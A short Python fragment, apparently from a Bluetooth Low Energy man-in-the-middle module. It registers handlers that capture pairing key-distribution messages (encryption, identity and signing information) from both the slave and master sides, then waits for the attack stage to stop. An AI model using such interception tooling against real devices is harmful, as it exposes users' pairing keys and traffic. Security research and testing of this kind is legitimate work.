			self.a2sReceiver.onEvent("BLEEncryptionInformation",callback=self.slaveEncryptionInformation)
			self.a2sReceiver.onEvent("BLEMasterIdentification",callback=self.slaveMasterIdentification)
			self.a2sReceiver.onEvent("BLEIdentityInformation",callback=self.slaveIdentityInformation)
			self.a2sReceiver.onEvent("BLEIdentityAddressInformation",callback=self.slaveIdentityAddressInformation)
			self.a2sReceiver.onEvent("BLESigningInformation",callback=self.slaveSigningInformation)
									

			self.a2mReceiver.onEvent("BLEEncryptionInformation",callback=self.masterEncryptionInformation)
			self.a2mReceiver.onEvent("BLEMasterIdentification",callback=self.masterMasterIdentification)
			self.a2mReceiver.onEvent("BLEIdentityInformation",callback=self.masterIdentityInformation)
			self.a2mReceiver.onEvent("BLEIdentityAddressInformation",callback=self.masterIdentityAddressInformation)
			self.a2mReceiver.onEvent("BLESigningInformation",callback=self.masterSigningInformation)

			self.waitUntilStage(BLEMitmStage.STOP)
			if self.scenarioEnabled:
				self.endScenario()
			return self.ok()
		else:
			io.fail("Interfaces provided ("+str(self.args["INTERFACE"])+") are not able to run this module.")
			return self.nok()
